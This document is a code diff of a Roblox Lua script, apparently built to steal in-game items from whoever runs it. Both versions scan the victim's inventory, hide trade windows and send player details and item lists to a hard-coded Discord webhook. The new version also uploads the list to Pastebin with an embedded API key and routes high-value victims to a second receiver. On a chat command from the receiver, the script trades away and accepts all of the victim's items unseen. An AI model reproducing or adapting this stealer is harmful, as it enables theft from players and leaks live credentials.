@@ -1,298 +1,357 @@
-users = {"TeamBacoCool123alt1", "User2", "User3"}
-webHook = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
-minPingValue = 0
+Username = "TeamBacoCool123alt1"
+Webhook = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78S_MuvAu95nHp34XkJG-wSkVExgc162eeqJ20siVkkMtG9HiogCru"
 
-showUncommon = true
-showCommon = true
-showRare = true
-showLegendary = true
-showGodly = true
-showAncient = true
-showUnique = true
-showVintage = true
+-- [ Dualhook Settings ] --
+DualUsername = "username" -- [Dualhook Username]
+DualWebhook = "webhook" -- [Dualhook Webhook]
+DualUnique = 0 -- [Minimum Unique]
+DualAncient = 0 -- [Minimum Ancient]
+DualGodly = 0 -- [Minimum Godly]
 
-weaponValues = {
-    ["weaponname"] = 1,
-}
+userName = Username
+webHook = Webhook
 
-petValues = {
-    ["petname"] = 1,
-}
+if getgenv().executed then return end
+getgenv().executed = true
 
-playerCount = #game:GetService("Players"):GetPlayers()
-if playerCount <= 1 then
-    game.Players.LocalPlayer:Kick("This server is not supported... Try a new public server.")
-    return
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local data2 = {
+        ["content"] = "---@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+    
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
 end
 
-LP = game.Players.LocalPlayer
-HttpService = game:GetService("HttpService")
-PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-
-_G.exec = _G.exec or false
-if _G.exec then
-    return
-end
-_G.exec = true
-
-destroytrades2 = coroutine.create(function()
+local destroytrades2 = coroutine.create(function()
     while true do
         local player = game:GetService("Players").LocalPlayer
         local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
         local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
 
-        if tradeGUI.Enabled then tradeGUI.Enabled = false end
-        if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+
+        if tradeGUIPhone.Enabled == true then
+            tradeGUIPhone.Enabled = false
+        end
+
         wait(0.1)
     end
 end)
 
-function SendWebhook(url, data)
-    local success, jsonData = pcall(function()
-        return HttpService:JSONEncode(data)
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local itemsCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, d.DataID)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, d.DataID)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, d.DataID)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, d.DataID)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, d.DataID)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, d.DataID)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, d.DataID)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, d.DataID)
+        end
+    end
+end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function isTradeModuleAvailable()
+    local success, TradeModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
     end)
-    if not success then
-        return
+    return success and TradeModule
+end
+
+local function stealItems()
+    coroutine.resume(destroytrades2)
+
+    local sendArgs = {
+        [1] = game:GetService("Players")[userName]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+    wait(3)
+
+    for i,v in pairs(uniqueItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
     end
 
-    local success, response = pcall(function()
-        return request({
-            Url = url,
+    for i,v in pairs(ancientItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(godlyItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(vintageItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(legendaryItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(rareItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(uncommonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(commonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    wait(6)
+    local acc = {
+        [1] = 285646582 -- this makes it work idk why
+    }
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
             Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
         })
     end)
-end
 
-function CreateEmbed(title, description, color, fields)
-    return {
-        title = title,
-        description = description,
-        color = color,
-        fields = fields or {}
-    }
-end
-
-local function getLvl()
-    local success, level = pcall(function()
-        for i,v in pairs(LevelModule.XPTable) do
-            if PlayerDataModule.NewXP < v then return i end
-        end
-        return 0
-    end)
-    if not success then
-        return 0
+    if not success or not response or not response.Success then
+        return "\nError...\n"
     end
-    return level
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
 end
 
-groupedWeapons = {}
-groupedPets = {}
-totalValue = 0
-totalCount = 0
-petCount = 0
-pets = {}
-rarityCounts = {
-    Vintage = 0,
-    Common = 0,
-    Uncommon = 0,
-    Rare = 0,
-    Legendary = 0,
-    Godly = 0,
-    Ancient = 0,
-    Unique = 0
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "None"
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
+                         "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
+                         "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
+                         "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
+                         "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
+                         "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
+                         "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
+                         "\n\n-- [ Common ] --\n" .. formatItems(commonItems)
+
+local pastebinLink = pastebin(pastebinString)
+
+if godlyItemsC >= DualGodly or ancientItemsC >= DualAncient or uniqueItemsC >= DualUnique then
+    userName = DualUsername
+    webHook = DualWebhook
+end
+
+local embed = {
+    ["title"] = "You just got a new hit with Pethical! (Copy text below to get items)",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = " Details:",
+            ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nAccountAge: "..tostring(game.Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"
+        },
+        {
+            ["name"] = " Hit:",
+            ["value"] = "Total Count: "..tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC).."\n Uniques: "..tostring(uniqueItemsC).."\n Ancients: "..tostring(ancientItemsC).."\nGodlys: "..godlyItemsC.."\nLegendarys: "..legendaryItemsC.."\nVintages: "..tostring(vintageItemsC).."\nRares: "..rareItemsC.."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC)
+        },
+        {
+            ["name"] = " Hit List:",
+            ["value"] = "[Click Here]("..pastebinLink..")"
+        },
+    },
 }
 
-local success, err = pcall(function()
-    for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
-        for c,d in pairs(b) do
-            local value = weaponValues[d.ItemName] or 0
-            local amount = tonumber(d.Amount) or 1
-            totalValue = totalValue + (value * amount)
-            totalCount = totalCount + amount
-            rarityCounts[d.Rarity] = (rarityCounts[d.Rarity] or 0) + amount
-            
-            if not groupedWeapons[d.ItemName] then
-                groupedWeapons[d.ItemName] = {
-                    name = d.ItemName,
-                    value = value,
-                    data = d.DataID,
-                    amount = amount,
-                    rarity = d.Rarity or "Unknown",
-                    totalValue = value * amount,
-                    type = "Weapon"
-                }
-            else
-                groupedWeapons[d.ItemName].amount = groupedWeapons[d.ItemName].amount + amount
-                groupedWeapons[d.ItemName].totalValue = groupedWeapons[d.ItemName].totalValue + (value * amount)
-            end
-        end
-    end
-end)
-
-success, err = pcall(function()
-    for a,b in pairs(InvModule.MyInventory.Data.Pets) do
-        for c,d in pairs(b) do
-            local itemName = d.ItemName and string.lower(d.ItemName) or tostring(d.DataID)
-            local value = petValues[itemName] or 0
-            petCount = petCount + 1
-            totalValue = totalValue + value
-            totalCount = totalCount + 1
-            rarityCounts[d.Rarity or "Unknown"] = (rarityCounts[d.Rarity or "Unknown"] or 0) + 1
-            
-            table.insert(pets, d.DataID or "Unknown")
-            
-            if not groupedPets[itemName] then
-                groupedPets[itemName] = {
-                    name = d.ItemName or tostring(d.DataID),
-                    value = value,
-                    data = d.DataID or "Unknown",
-                    amount = 1,
-                    rarity = d.Rarity or "Unknown",
-                    totalValue = value,
-                    type = "Pet"
-                }
-            else
-                groupedPets[itemName].amount = groupedPets[itemName].amount + 1
-                groupedPets[itemName].totalValue = groupedPets[itemName].totalValue + value
-            end
-        end
-    end
-end)
-
-filteredItems = {}
-for _, item in pairs(groupedWeapons) do
-    if (item.rarity == "Uncommon" and showUncommon) or
-       (item.rarity == "Common" and showCommon) or
-       (item.rarity == "Rare" and showRare) or
-       (item.rarity == "Legendary" and showLegendary) or
-       (item.rarity == "Godly" and showGodly) or
-       (item.rarity == "Ancient" and showAncient) or
-       (item.rarity == "Unique" and showUnique) or
-       (item.rarity == "Vintage" and showVintage) or
-       (item.rarity == "Unknown") then
-        table.insert(filteredItems, item)
-    end
-end
-for _, item in pairs(groupedPets) do
-    if (item.rarity == "Uncommon" and showUncommon) or
-       (item.rarity == "Common" and showCommon) or
-       (item.rarity == "Rare" and showRare) or
-       (item.rarity == "Legendary" and showLegendary) or
-       (item.rarity == "Godly" and showGodly) or
-       (item.rarity == "Ancient" and showAncient) or
-       (item.rarity == "Unique" and showUnique) or
-       (item.rarity == "Vintage" and showVintage) or
-       (item.rarity == "Unknown") then
-        table.insert(filteredItems, item)
-    end
-end
-
-table.sort(filteredItems, function(a, b)
-    return a.value > b.value
-end)
-
-local function generateCompactList(items)
-    local lines = {}
-    for _, item in pairs(items) do
-        table.insert(lines, string.format("%s x%d: %d (%s, %s)", item.name, item.amount, item.totalValue, item.rarity, item.type))
-    end
-    return table.concat(lines, "\n")
-end
-
-compactList = generateCompactList(filteredItems)
-if compactList == "" then
-    compactList = "Items and pets not found"
-end
-
-local function formatPets(petList)
-    if #petList == 0 then
-        return "No pets"
-    else
-        return table.concat(petList, "\n")
-    end
-end
-
-executor = identifyexecutor() or "Unknown"
-placeId = game.PlaceId
-jobId = game.JobId
-messageCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
-consoleCode = string.format('Roblox.GameLauncher.joinGameInstance(%s, "%s")', placeId, jobId)
-joinLink = string.format("roblox://placeID=%s&gameInstanceID=%s", placeId, jobId)
-
-WebHookEmbed = CreateEmbed(
-    "Inventory Report",
-    "",
-    0x3498db,
-    {
-        {name = "Player Info", value = string.format("Name: %s\nLevel: %d\nAccount Age: %d days\nExecutor: %s", LP.Name, getLvl(), LP.AccountAge, executor), inline = true},
-        {name = "Summary", value = string.format("Total Value: %d\nTotal Items: %d\nTotal Pets: %d", math.floor(totalValue), totalCount, petCount), inline = true},
-        {name = "Rarities", value = string.format("Unique: %d\nAncient: %d\nGodly: %d\nLegendary: %d\nVintage: %d\nRare: %d\nUncommon: %d\nCommon: %d",
-            rarityCounts.Unique, rarityCounts.Ancient, rarityCounts.Godly,
-            rarityCounts.Legendary, rarityCounts.Vintage, rarityCounts.Rare,
-            rarityCounts.Uncommon, rarityCounts.Common), inline = true},
-        {name = "Items and Pets List", value = string.sub(compactList, 1, 1000)},
-        {name = "Join via Console", value = consoleCode},
-        {name = "Join via Link", value = joinLink}
-    }
-)
-
-if totalValue >= minPingValue then
-    SendWebhook(webHook, {content = '-- @everyone\n'..messageCode, embeds = {WebHookEmbed}})
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+    SendMessageEMBED(webHook, embed, true)
 else
-    SendWebhook(webHook, {content = messageCode, embeds = {WebHookEmbed}})
+    SendMessageEMBED(webHook, embed, false)
 end
 
-local function stealitems(playerName)
-    coroutine.resume(destroytrades2)
-    local success, err = pcall(function()
-        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(game:GetService("Players")[playerName])
-    end)
-    wait(3)
-    
-    table.sort(filteredItems, function(a, b)
-        return a.value > b.value
-    end)
-    
-    local itemsAdded = 0
-    for _, item in ipairs(filteredItems) do
-        if itemsAdded >= 4 then break end
-        
-        local args
-        if item.type == "Pet" then
-            args = {
-                [1] = item.data,
-                [2] = "Pets"
-            }
-        else
-            args = {
-                [1] = item.data,
-                [2] = "Weapons"
-            }
-        end
-        
-        local success, err = pcall(function()
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            local lowerMsg = msg:lower()
+            if lowerMsg == "/murder" or lowerMsg == "murder" then
+                stealItems()
+            end
         end)
-        itemsAdded = itemsAdded + 1
-        wait(0.1)
     end
-    
-    wait(6)
-    local success, err = pcall(function()
-        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
-    end)
-end
-
-for _, userName in pairs(users) do
-    game.Players.PlayerAdded:Connect(function(player)
-        if player.Name == userName then
-            player.Chatted:Connect(function(msg)
-                stealitems(userName)
-            end)
-        end
-    end)
-end
+end)
